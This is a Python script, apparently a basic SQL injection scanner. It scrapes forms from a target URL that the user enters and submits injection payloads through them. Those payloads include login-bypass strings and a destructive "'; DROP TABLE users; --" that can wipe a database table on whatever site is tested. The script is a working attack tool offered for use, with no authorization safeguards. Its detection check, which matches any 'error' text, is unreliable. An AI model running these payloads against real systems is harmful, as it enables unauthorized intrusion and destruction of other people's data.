import requests
from bs4 import BeautifulSoup

def find_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find_all('form')

def submit_form(form, url, payload):
    action = form.get('action')
    post_url = url + action
    method = form.get('method')
    inputs = form.find_all('input')
    data = {}

    for input in inputs:
        if input.get('type') in ['text', 'search', 'password', 'email']:
            data[input.get('name')] = payload
        else:
            data[input.get('name')] = input.get('value')

    if method == 'post':
        return requests.post(post_url, data=data)
    else:
        return requests.get(post_url, params=data)

def sqli_scan(url):
    forms = find_forms(url)
    sql_payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "'; DROP TABLE users; --"]
    for form in forms:
        for payload in sql_payloads:
            response = submit_form(form, url, payload)
            if "sql" in response.text.lower() or "error" in response.text.lower():
                print(f"[!] SQL Injection vulnerability detected with payload: {payload}")
                print(f"[*] Form details: {form}")
                break
        else:
            print("[-] No SQL Injection vulnerability found.")

if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., http://example.com): ")
    sqli_scan(target_url)
